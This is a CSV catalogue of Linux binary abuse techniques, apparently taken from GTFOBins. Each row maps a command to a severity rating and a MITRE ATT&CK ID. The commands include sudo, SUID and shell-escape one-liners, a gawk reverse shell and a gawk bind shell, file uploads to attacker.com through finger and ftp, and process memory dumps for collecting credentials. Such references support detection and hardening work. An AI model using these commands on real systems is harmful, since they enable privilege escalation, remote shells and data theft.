571,Linux,file -f /path/to/input-file,Abuse the 'file' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/file/
572,Linux,file -f /path/to/input-file,Abuse the 'file' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/file/
573,Linux,file -f /path/to/input-file,Abuse the 'file' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/file/
574,Linux,file -m /path/to/input-file,"Abuse the 'file' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string and wrapped inside quotes. If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments. It can also be provided with a directory and will read each file in the directory.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/file/
575,Linux,file -m /path/to/input-file,"Abuse the 'file' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string and wrapped inside quotes. If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments. It can also be provided with a directory and will read each file in the directory.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/file/
576,Linux,file -m /path/to/input-file,"Abuse the 'file' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Each line is corrupted by a prefix string and wrapped inside quotes. If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments. It can also be provided with a directory and will read each file in the directory.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/file/
577,Linux,find /path/to/input-file -exec cat {} \;,"Abuse the 'find' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/find/
578,Linux,find /path/to/input-file -exec cat {} \;,"Abuse the 'find' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/find/
579,Linux,find /path/to/input-file -exec cat {} \;,"Abuse the 'find' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/find/
580,Linux,find / -fprintf /path/to/output-file DATA -quit,"Abuse the 'find' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. `DATA` is a format string, it supports some escape sequences.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/find/
581,Linux,find / -fprintf /path/to/output-file DATA -quit,"Abuse the 'find' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. `DATA` is a format string, it supports some escape sequences.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/find/
582,Linux,find / -fprintf /path/to/output-file DATA -quit,"Abuse the 'find' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. `DATA` is a format string, it supports some escape sequences.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/find/
583,Linux,find . -exec /bin/sh \; -quit,Abuse the 'find' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/find/
584,Linux,find . -exec /bin/sh -p \; -quit,Abuse the 'find' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/find/
585,Linux,find . -exec /bin/sh \; -quit,Abuse the 'find' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/find/
586,Linux,finger x@attacker.com,Abuse the 'finger' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. The command hangs waiting for the remote peer to close the socket.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/finger/
587,Linux,finger x@attacker.com,Abuse the 'finger' binary (download) in a suid context to escalate privileges or execute arbitrary actions. The command hangs waiting for the remote peer to close the socket.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/finger/
588,Linux,finger x@attacker.com,Abuse the 'finger' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. The command hangs waiting for the remote peer to close the socket.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/finger/
589,Linux,finger DATA@attacker.com,Abuse the 'finger' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. The command hangs waiting for the remote peer to close the socket.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/finger/
590,Linux,finger DATA@attacker.com,Abuse the 'finger' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. The command hangs waiting for the remote peer to close the socket.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/finger/
591,Linux,finger DATA@attacker.com,Abuse the 'finger' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. The command hangs waiting for the remote peer to close the socket.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/finger/
592,Linux,firejail /bin/sh,Abuse the 'firejail' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/firejail/
593,Linux,firejail /bin/sh,Abuse the 'firejail' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/firejail/
594,Linux,fish,Abuse the 'fish' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/fish/
595,Linux,fish,Abuse the 'fish' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/fish/
596,Linux,fish,Abuse the 'fish' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/fish/
597,Linux,flock -u / /bin/sh,Abuse the 'flock' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/flock/
598,Linux,flock -u / /bin/sh -p,Abuse the 'flock' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/flock/
599,Linux,flock -u / /bin/sh,Abuse the 'flock' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/flock/
600,Linux,fmt -pNON_EXISTING_PREFIX /path/to/input-file,Abuse the 'fmt' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/fmt/
601,Linux,fmt -pNON_EXISTING_PREFIX /path/to/input-file,Abuse the 'fmt' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/fmt/
602,Linux,fmt -pNON_EXISTING_PREFIX /path/to/input-file,Abuse the 'fmt' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/fmt/
603,Linux,fmt -999 /path/to/input-file,Abuse the 'fmt' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This corrupts the output by wrapping very long lines at the given width (`999`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/fmt/
604,Linux,fmt -999 /path/to/input-file,Abuse the 'fmt' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This corrupts the output by wrapping very long lines at the given width (`999`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/fmt/
605,Linux,fmt -999 /path/to/input-file,Abuse the 'fmt' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This corrupts the output by wrapping very long lines at the given width (`999`).,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/fmt/
606,Linux,fold -w999 /path/to/input-file,Abuse the 'fold' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This corrupts the output by wrapping very long lines at the given width (`999`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/fold/
607,Linux,fold -w999 /path/to/input-file,Abuse the 'fold' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This corrupts the output by wrapping very long lines at the given width (`999`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/fold/
608,Linux,fold -w999 /path/to/input-file,Abuse the 'fold' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This corrupts the output by wrapping very long lines at the given width (`999`).,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/fold/
609,Linux,"echo '#!/bin/sh' >/path/to/temp-file echo -e ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" >>/path/to/temp-file chmod +x /path/to/temp-file forge build --use /path/to/temp-file",Abuse the 'forge' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/forge/
610,Linux,"echo '#!/bin/sh' >/path/to/temp-file echo -e ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" >>/path/to/temp-file chmod +x /path/to/temp-file forge build --use /path/to/temp-file",Abuse the 'forge' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/forge/
611,Linux,"echo '#!/bin/sh' >/path/to/temp-file echo -e ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" >>/path/to/temp-file chmod +x /path/to/temp-file forge build --use /path/to/temp-file",Abuse the 'forge' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/forge/
612,Linux,fping -f /path/to/input-file,Abuse the 'fping' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Each line is treated as an hostname and it's leaked as an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/fping/
613,Linux,fping -f /path/to/input-file,Abuse the 'fping' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Each line is treated as an hostname and it's leaked as an error message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/fping/
614,Linux,fping -f /path/to/input-file,Abuse the 'fping' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Each line is treated as an hostname and it's leaked as an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/fping/
615,Linux,ftp -a attacker.com get /path/to/input-file output-file,"Abuse the 'ftp' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ftp/
616,Linux,ftp -a attacker.com get /path/to/input-file output-file,"Abuse the 'ftp' binary (download) in a suid context to escalate privileges or execute arbitrary actions. Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ftp/
617,Linux,ftp -a attacker.com get /path/to/input-file output-file,"Abuse the 'ftp' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.",File Download,Low,T1105,https://gtfobins.github.io/gtfobins/ftp/
618,Linux,ftp !/bin/sh,Abuse the 'ftp' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ftp/
619,Linux,ftp !/bin/sh,Abuse the 'ftp' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ftp/
620,Linux,ftp !/bin/sh,Abuse the 'ftp' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ftp/
621,Linux,ftp -a attacker.com put /path/to/input-file output-file,"Abuse the 'ftp' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ftp/
622,Linux,ftp -a attacker.com put /path/to/input-file output-file,"Abuse the 'ftp' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/ftp/
623,Linux,ftp -a attacker.com put /path/to/input-file output-file,"Abuse the 'ftp' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.",File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/ftp/
624,Linux,fzf --listen=12345,"Abuse the 'fzf' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. Commands can be issued via POST requests, for example: ``` curl http://localhost:12345 -d 'execute(/path/to/command)' ```",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/fzf/
625,Linux,fzf --listen=12345,"Abuse the 'fzf' binary (command) in a suid context to escalate privileges or execute arbitrary actions. Commands can be issued via POST requests, for example: ``` curl http://localhost:12345 -d 'execute(/path/to/command)' ```",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/fzf/
626,Linux,fzf --listen=12345,"Abuse the 'fzf' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions. Commands can be issued via POST requests, for example: ``` curl http://localhost:12345 -d 'execute(/path/to/command)' ```",Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/fzf/
627,Linux,fzf --bind 'enter:execute(/bin/sh)',Abuse the 'fzf' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Press `Enter` to receive the shell.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/fzf/
628,Linux,fzf --bind 'enter:execute(/bin/sh)',Abuse the 'fzf' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. Press `Enter` to receive the shell.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/fzf/
629,Linux,fzf --bind 'enter:execute(/bin/sh)',Abuse the 'fzf' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. Press `Enter` to receive the shell.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/fzf/
630,Linux,"gawk 'BEGIN { s = ""/inet/tcp/12345/0/0""; while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",Abuse the 'gawk' binary (bind shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/gawk/
631,Linux,"gawk 'BEGIN { s = ""/inet/tcp/12345/0/0""; while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",Abuse the 'gawk' binary (bind shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/gawk/
632,Linux,"gawk 'BEGIN { s = ""/inet/tcp/12345/0/0""; while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",Abuse the 'gawk' binary (bind shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Bind Shell,High,T1059,https://gtfobins.github.io/gtfobins/gawk/
633,Linux,gawk '//' /path/to/input-file,Abuse the 'gawk' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gawk/
634,Linux,gawk '//' /path/to/input-file,Abuse the 'gawk' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/gawk/
635,Linux,gawk '//' /path/to/input-file,Abuse the 'gawk' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/gawk/
636,Linux,"gawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'",Abuse the 'gawk' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/gawk/
637,Linux,"gawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'",Abuse the 'gawk' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/gawk/
638,Linux,"gawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'",Abuse the 'gawk' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/gawk/
639,Linux,"gawk 'BEGIN { s = ""/inet/tcp/0/attacker.com/12345""; while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",Abuse the 'gawk' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/gawk/
640,Linux,"gawk 'BEGIN { s = ""/inet/tcp/0/attacker.com/12345""; while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",Abuse the 'gawk' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/gawk/
641,Linux,"gawk 'BEGIN { s = ""/inet/tcp/0/attacker.com/12345""; while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",Abuse the 'gawk' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/gawk/
642,Linux,"gawk 'BEGIN {system(""/bin/sh"")}'",Abuse the 'gawk' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/gawk/
643,Linux,"gawk 'BEGIN {system(""/bin/sh"")}'",Abuse the 'gawk' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/gawk/
644,Linux,"gawk 'BEGIN {system(""/bin/sh"")}'",Abuse the 'gawk' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/gawk/
645,Linux,gcc -x c -E /path/to/input-file,Abuse the 'gcc' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gcc/
646,Linux,gcc -x c -E /path/to/input-file,Abuse the 'gcc' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/gcc/
647,Linux,gcc @/path/to/input-file,"Abuse the 'gcc' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is read and parsed as a list of files (one per line), the content is displayed as error messages.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gcc/
648,Linux,gcc @/path/to/input-file,"Abuse the 'gcc' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is read and parsed as a list of files (one per line), the content is displayed as error messages.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/gcc/
649,Linux,gcc -x c /dev/null -o /path/to/input-file,Abuse the 'gcc' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This actually deletes the file.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/gcc/
650,Linux,gcc -x c /dev/null -o /path/to/input-file,Abuse the 'gcc' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This actually deletes the file.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/gcc/
651,Linux,"gcc -wrapper /bin/sh,-s x","Abuse the 'gcc' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. In some older versions, the `x` argument must instead reference any existing file.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/gcc/
652,Linux,"gcc -wrapper /bin/sh,-s x","Abuse the 'gcc' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. In some older versions, the `x` argument must instead reference any existing file.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/gcc/
653,Linux,gcloud help,Abuse the 'gcloud' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gcloud/
654,Linux,gcloud help,Abuse the 'gcloud' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/gcloud/
655,Linux,gcloud help,Abuse the 'gcloud' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/gcloud/
656,Linux,gcore $PID,"Abuse the 'gcore' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gcore/
657,Linux,gcore $PID,"Abuse the 'gcore' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/gcore/
658,Linux,gcore $PID,"Abuse the 'gcore' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/gcore/
659,Linux,"gdb -nx -ex 'dump value /path/to/output-file ""DATA""' -ex quit",Abuse the 'gdb' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/gdb/
660,Linux,"gdb -nx -ex 'dump value /path/to/output-file ""DATA""' -ex quit",Abuse the 'gdb' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/gdb/
661,Linux,"gdb -nx -ex 'dump value /path/to/output-file ""DATA""' -ex quit",Abuse the 'gdb' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/gdb/
662,Linux,gdb -nx -ex 'python ...' -ex quit,Abuse the 'gdb' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gdb/
663,Linux,gdb -nx -ex 'python ...' -ex quit,Abuse the 'gdb' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/gdb/
664,Linux,gdb -nx -ex 'python ...' -ex quit,Abuse the 'gdb' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/gdb/
665,Linux,gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit,Abuse the 'gdb' binary (shell) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Critical,T1548.001,https://gtfobins.github.io/gtfobins/gdb/
666,Linux,gdb -nx -ex '!/bin/sh' -ex quit,Abuse the 'gdb' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/gdb/
667,Linux,gdb -nx -ex '!/bin/sh' -ex quit,Abuse the 'gdb' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/gdb/
668,Linux,gdb -nx -ex '!/bin/sh' -ex quit,Abuse the 'gdb' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/gdb/
669,Linux,gem open debug,"Abuse the 'gem' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gem/
670,Linux,gem open debug,"Abuse the 'gem' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.",Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/gem/
671,Linux,gem build /path/to/script.rb,Abuse the 'gem' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gem/
672,Linux,gem build /path/to/script.rb,Abuse the 'gem' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/gem/
673,Linux,gem install --file /path/to/script.rb,Abuse the 'gem' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/gem/
674,Linux,gem install --file /path/to/script.rb,Abuse the 'gem' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/gem/
675,Linux,gem open -e '/bin/sh -s' debug,"Abuse the 'gem' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/gem/
676,Linux,gem open -e '/bin/sh -s' debug,"Abuse the 'gem' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/gem/
677,Linux,genie -c '/bin/sh',Abuse the 'genie' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/genie/
678,Linux,genie -c '/bin/sh',Abuse the 'genie' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/genie/
679,Linux,genie -c '/bin/sh',Abuse the 'genie' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/genie/
680,Linux,genisoimage -q -o - /path/to/input-file,"Abuse the 'genisoimage' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/genisoimage/
681,Linux,genisoimage -q -o - /path/to/input-file,"Abuse the 'genisoimage' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/genisoimage/
682,Linux,genisoimage -q -o - /path/to/input-file,"Abuse the 'genisoimage' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/genisoimage/
683,Linux,genisoimage -sort /path/to/input-file,"Abuse the 'genisoimage' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is parsed, and some of its content is disclosed by the error messages.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/genisoimage/
684,Linux,genisoimage -sort /path/to/input-file,"Abuse the 'genisoimage' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is parsed, and some of its content is disclosed by the error messages.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/genisoimage/
685,Linux,genisoimage -sort /path/to/input-file,"Abuse the 'genisoimage' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is parsed, and some of its content is disclosed by the error messages.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/genisoimage/
